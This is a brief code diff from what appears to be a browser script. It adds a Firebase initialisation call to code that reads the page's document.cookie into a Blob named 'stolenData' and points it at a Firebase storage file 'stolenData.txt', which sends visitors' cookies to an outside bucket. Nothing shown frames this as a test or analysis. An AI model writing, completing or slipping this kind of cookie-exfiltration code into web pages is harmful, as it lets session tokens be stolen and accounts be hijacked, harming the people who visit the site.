@@ -69,6 +69,8 @@
             appId: "1:756338805186:web:cb740e035ac611b5baae5b",
   };
 
+	firebase.initializeApp(firebaseConfig);
+
   var stolenData = new Blob([document.cookie], {type: "text/plain"});
   var storageRef = firebase.storage().ref("stolenData.txt");
   
